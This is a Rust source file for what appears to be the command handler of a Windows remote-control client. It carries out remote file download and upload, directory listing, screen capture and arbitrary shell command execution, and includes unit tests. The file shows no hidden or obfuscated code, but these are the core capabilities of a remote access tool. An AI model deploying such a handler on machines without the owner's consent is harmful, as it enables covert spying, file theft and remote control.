use crate::context::Context;
use crate::{cmd_util, screen};
use anyhow::anyhow;
use common::command::{Command, CtrlCommand};
use common::file_util;
use common::message::dok::Dok;
use common::message::dok::Dok::FilePart;
use common::message::kik_cmd_resp_info;
use common::message::kik_resp::{kik_error, kik_success_data_id, kik_success_info, KikResp};
use common::protocol::BufSerializable;
use log::warn;
use std::collections::BTreeMap;
use std::path::{Path, PathBuf};
use tokio::fs;
use tokio_util::either::Either;
use uuid::Uuid;

pub async fn run(context: &Context, cmd: Command) -> KikResp {
    match cmd {
        Command::Ctrl(c) => {
            let resp = match c {
                CtrlCommand::GetFile(file_path, _) => match file_util::read_file(file_path).await {
                    Ok(v) => match context.find_and_send_data(&v).await {
                        Ok(data_id) => {
                            return kik_success_data_id(data_id);
                        }
                        Err(e) => kik_error(format!("Kik发送数据失败,error:{:?}", e)),
                    },
                    Err(e) => kik_error(format!("Kik读取文件失败:{}", e)),
                },
                CtrlCommand::GetBigFile(file_path, _) => {
                    match do_get_big_file(context, file_path).await {
                        Either::Left(info) => kik_success_info(info),
                        Either::Right(data_id) => return kik_success_data_id(data_id),
                    }
                }
                CtrlCommand::SetBigFile(data_id, total, hash, save_path) => {
                    match set_big_file(context, data_id, total, hash, save_path.clone()).await {
                        Ok(_) => kik_success_info(format!("保存大文件至Kik:{}成功", save_path)),
                        Err(e) => {
                            kik_error(format!("保存大文件至Kik:{}失败,error:{}", save_path, e))
                        }
                    }
                }
                CtrlCommand::SetFile(data_id, save_path) => {
                    //recv data
                    match context.read_data(data_id).await {
                        Ok(data) => {
                            //save_path
                            match file_util::save_file(save_path.as_str(), &data).await {
                                Ok(_) => {
                                    kik_success_info(format!("保存文件至Kik:{}成功", save_path))
                                }
                                Err(e) => kik_error(format!(
                                    "保存文件至Kik:{}失败,error:{}",
                                    save_path, e
                                )),
                            }
                        }
                        Err(e) => kik_error(format!("{}", e)),
                    }
                }
                CtrlCommand::Ls(s) => {
                    let args: Vec<&str> = s.split_ascii_whitespace().collect();
                    match (match args.as_slice() {
                        [path, arg, ..] => {
                            if *arg == "-r" {
                                file_util::ls(*path, true)
                            } else {
                                file_util::ls(*path, false)
                            }
                        }
                        _ => file_util::ls(s.as_str(), false),
                    })
                    .await
                    .and_then(|v| {
                        Ok(serde_json::to_string(
                            &v.into_iter()
                                .map(|(filename, is_file, size, created_date, modified_date)| {
                                    kik_cmd_resp_info::Ls {
                                        size,
                                        filename,
                                        is_file,
                                        created_date,
                                        modified_date,
                                    }
                                })
                                .collect::<Vec<kik_cmd_resp_info::Ls>>(),
                        )?)
                    }) {
                        Ok(json) => kik_success_info(json),
                        Err(e) => kik_error(e.to_string()),
                    }
                }
                CtrlCommand::Screen(_) => {
                    let request = screen::CaptureRequest::png(screen::PngProfile::Balanced);
                    match screen::capture_screen(request).await {
                        Ok(v) => match context.find_and_send_data(&v).await {
                            Ok(data_id) => {
                                return kik_success_data_id(data_id);
                            }
                            Err(e) => kik_error(format!("Kik发送数据失败,error:{:?}", e)),
                        },
                        Err(e) => kik_error(format!("Kik截屏失败,error:{:?}", e)),
                    }
                }
            };
            resp
        }
        Command::Exec(s) => match cmd_util::cmd_exec_line(s.as_str(), false, true).await {
            Ok(res) => kik_success_info(res),
            Err(e) => kik_error(format!("cmd exec error:{}", e)),
        },
        _ => kik_error("暂不支持该类型消息".to_string()),
    }
}

async fn do_get_big_file(context: &Context, file_path: String) -> Either<String, String> {
    let file_size = match file_util::get_file_size(file_path.as_str()).await {
        Ok(size) => size,
        Err(error) => return Either::Left(format!("获取文件失败,error:{}", error)),
    };
    if file_size > 1024 * 1024 * 1024 {
        Either::Left("暂不支持1G以上的文件".to_string())
    } else {
        match file_util::read_file(file_path).await {
            Ok(v) => match context.find_and_send_data(&v).await {
                Ok(data_id) => Either::Right(data_id),
                Err(e) => Either::Left(format!("Kik发送数据失败,error:{:?}", e)),
            },
            Err(e) => Either::Left(format!("Kik读取文件失败:{}", e)),
        }
    }
}

async fn set_big_file(
    context: &Context,
    data_id: String,
    total: u64,
    hash: Vec<u8>,
    save_path: String,
) -> anyhow::Result<()> {
    const MAX_BIG_FILE_BYTES: u64 = 1024 * 1024 * 1024;
    if total > MAX_BIG_FILE_BYTES {
        return Err(anyhow!("暂不支持 1 GiB 以上的大文件"));
    }
    if hash.len() != 32 {
        return Err(anyhow!("SHA-256 长度必须为 32 bytes"));
    }
    let destination = PathBuf::from(&save_path);
    let file_name = destination
        .file_name()
        .ok_or(anyhow!("获取文件名失败"))?
        .to_string_lossy();
    let parent = destination.parent().unwrap_or_else(|| Path::new("."));
    fs::create_dir_all(parent).await?;
    // 临时文件必须与目标文件位于同一卷，最终才能原子替换且不提前破坏旧文件。
    let temp_file_path = parent.join(format!(".{}.{}.rtc-part", file_name, Uuid::new_v4()));
    let temp_file = fs::OpenOptions::new()
        .write(true)
        .create_new(true)
        .open(&temp_file_path)
        .await?;
    drop(temp_file);

    let result = receive_big_file(
        context,
        &data_id,
        total,
        &hash,
        &temp_file_path,
        &destination,
    )
    .await;
    if result.is_err() {
        if let Err(cleanup_error) = fs::remove_file(&temp_file_path).await {
            warn!(
                "清理失败的大文件临时文件失败: path={}, error={}",
                temp_file_path.display(),
                cleanup_error
            );
        }
    }
    result
}

async fn receive_big_file(
    context: &Context,
    data_id: &str,
    total: u64,
    hash: &[u8],
    temp_file_path: &Path,
    destination: &Path,
) -> anyhow::Result<()> {
    let mut received = 0u64;
    let mut ranges = BTreeMap::<u64, u64>::new();

    while received < total {
        let data = context.read_data(data_id.to_string()).await?;
        let dok = Dok::from_buf(data).ok_or(anyhow!("大文件数据格式错误!"))?;
        match dok {
            FilePart(start, end, data) => {
                register_file_part(&mut ranges, start, end, data.len(), total)?;
                received = received
                    .checked_add(data.len() as u64)
                    .ok_or_else(|| anyhow!("大文件接收字节数溢出"))?;
                if received > total {
                    return Err(anyhow!("大文件接收字节数超过声明大小"));
                }
                file_util::write_range_file(temp_file_path, start, end, data).await?;
            }
            Dok::Err(code) => return Err(anyhow!("发送端报告大文件传输失败: {code:?}")),
        }
    }
    file_util::set_file_size(temp_file_path, total).await?;
    if !hash.eq(&file_util::compute_hash(temp_file_path.to_string_lossy()).await?) {
        return Err(anyhow!("hash校验失败，数据错误"));
    }
    replace_file(temp_file_path, destination).await?;
    Ok(())
}

fn register_file_part(
    ranges: &mut BTreeMap<u64, u64>,
    start: u64,
    end: u64,
    data_len: usize,
    total: u64,
) -> anyhow::Result<()> {
    if start > end || end >= total {
        return Err(anyhow!("大文件分片范围越界: {start}..={end}"));
    }
    let declared_len = end
        .checked_sub(start)
        .and_then(|length| length.checked_add(1))
        .ok_or_else(|| anyhow!("大文件分片长度溢出"))?;
    if declared_len != data_len as u64 {
        return Err(anyhow!("大文件分片范围与数据长度不一致"));
    }
    if ranges
        .range(..=start)
        .next_back()
        .is_some_and(|(_, previous_end)| *previous_end >= start)
        || ranges
            .range(start..)
            .next()
            .is_some_and(|(next_start, _)| *next_start <= end)
    {
        return Err(anyhow!("大文件分片范围重复或重叠: {start}..={end}"));
    }
    ranges.insert(start, end);
    Ok(())
}

async fn replace_file(source: &Path, destination: &Path) -> anyhow::Result<()> {
    use std::os::windows::ffi::OsStrExt;
    use windows::core::PCWSTR;
    use windows::Win32::Storage::FileSystem::{
        MoveFileExW, MOVEFILE_REPLACE_EXISTING, MOVEFILE_WRITE_THROUGH,
    };

    let source = source.to_path_buf();
    let destination = destination.to_path_buf();
    tokio::task::spawn_blocking(move || {
        let source_wide = source
            .as_os_str()
            .encode_wide()
            .chain(std::iter::once(0))
            .collect::<Vec<_>>();
        let destination_wide = destination
            .as_os_str()
            .encode_wide()
            .chain(std::iter::once(0))
            .collect::<Vec<_>>();
        unsafe {
            MoveFileExW(
                PCWSTR(source_wide.as_ptr()),
                PCWSTR(destination_wide.as_ptr()),
                MOVEFILE_REPLACE_EXISTING | MOVEFILE_WRITE_THROUGH,
            )
        }
        .map_err(|error| anyhow!("原子替换目标文件失败: {error}"))
    })
    .await
    .map_err(|error| anyhow!("文件替换任务失败: {error}"))??;
    Ok(())
}

#[cfg(test)]
mod tests {
    use super::{register_file_part, run};
    use crate::context::Context;
    use common::command::Command;
    use common::message::kik_resp::{ClientSuccessResp, KikResp};
    use std::collections::BTreeMap;

    #[test]
    fn big_file_ranges_accept_out_of_order_but_reject_overlap() {
        let mut ranges = BTreeMap::new();
        register_file_part(&mut ranges, 10, 19, 10, 30).unwrap();
        register_file_part(&mut ranges, 0, 9, 10, 30).unwrap();
        register_file_part(&mut ranges, 20, 29, 10, 30).unwrap();

        assert!(register_file_part(&mut ranges, 5, 14, 10, 30).is_err());
        assert!(register_file_part(&mut ranges, 0, 8, 10, 30).is_err());
        assert!(register_file_part(&mut ranges, 30, 30, 1, 30).is_err());
    }

    #[tokio::test]
    async fn exec_is_available_in_default_build() {
        let response = run(
            &Context::new(),
            Command::Exec("echo rtc-exec-default".to_string()),
        )
        .await;

        match response {
            KikResp::Success(ClientSuccessResp::Info(output)) => {
                assert!(output.contains("rtc-exec-default"));
            }
            other => panic!("默认构建 Exec 返回了异常响应: {other:?}"),
        }
    }
}
